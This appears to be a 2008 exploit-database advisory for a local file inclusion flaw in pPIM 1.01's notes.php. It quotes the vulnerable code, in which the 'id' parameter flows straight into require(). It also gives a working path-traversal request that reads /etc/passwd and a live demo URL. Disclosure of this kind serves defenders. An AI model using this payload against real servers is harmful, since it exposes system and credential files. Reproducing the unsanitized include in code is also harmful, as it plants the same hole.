@@ -1,0 +1,65 @@
+# pPIM 1.01 (notes.php id) Local File Inclusion Vulnerability
+# url: http://www.phlatline.org/docs/files/ppim.zip
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+
+description of vulnerability:
+-----------------------------------------------
+the variable 'id' has been not defined in code 
+and the variable 'id' is sent by the users.
+-----------------------------------------------
+
+vuln file: notes.php
+
+vuln code:
+x:  >...
+107: if (isset($_GET["mode"]))
+
+	 {
+
+	  	if ($_GET["mode"]=="edit")
+
+		{
+
+		 if (isset($_GET['id']))
+
+		 {
+
+		  	$notefile = $_GET['id'];
+
+			if ($notefile == "new")
+
+			{
+
+			 $title = "";
+
+			 $notes = "";
+
+			}
+
+			else
+
+			{
+
+			 $temp = "notes/" . $notefile;
+
+			 require($temp);
+
+123:			}
+x:  <...
+x: }}}
+
+exploit: GET /notes.php?mode=edit&id=[file]
+sample (xpl): http://www.localhost.com/notes.php?mode=edit&id=../../../../../../../../../../etc/passwd
+
+live demo:
+http://www.phlatline.org/docs/demos/ppim/notes.php?mode=edit&id=../notes.php
+
+# milw0rm.com [2008-10-04]
